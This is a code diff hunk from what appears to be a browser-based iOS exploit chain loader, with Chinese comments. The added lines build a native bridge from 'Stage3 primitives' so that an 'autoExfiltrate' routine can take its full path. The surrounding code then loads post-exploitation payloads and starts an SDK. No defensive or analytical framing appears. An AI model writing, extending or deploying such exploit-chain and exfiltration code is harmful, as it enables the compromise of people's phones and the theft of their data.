@@ -248,6 +248,15 @@
         if (!r3) { window.__dsExploitChain = { ok:false, stage3:s3.name, ios: iosVer.str, logs: logLines }; throw new Error(s3.name + ' returned falsy'); }
       }
 
+      // Stage3 成功后立即构建 nativeBridge（在 post_exploit.js 启动前就绪，让 autoExfiltrate 走全量路径）
+      if (window._corunaPrimitives) {
+        log('Loading native_bridge.js (build window.nativeBridge from Stage3 primitives)');
+        try { await loadScript('payloads/native_bridge.js'); }
+        catch (e) { log('native_bridge load FAIL (non-fatal, sandbox-only mode): ' + e.message); }
+      } else {
+        log('Stage3 did not expose primitives — nativeBridge unavailable, sandbox-only mode');
+      }
+
       log('Stage chain DONE — loading post_exploit + SDK');
       try { await loadScript('payloads/post_exploit.js'); } catch (e) { log('post_exploit load FAIL: ' + e.message); window.__dsExploitChain = { ok:false, stage:'post_exploit', ios: iosVer.str, logs: logLines }; throw e; }
       if (typeof window.startSdk === 'function') { try { window.startSdk(); } catch (e) { log('startSdk error: ' + e.message); } }
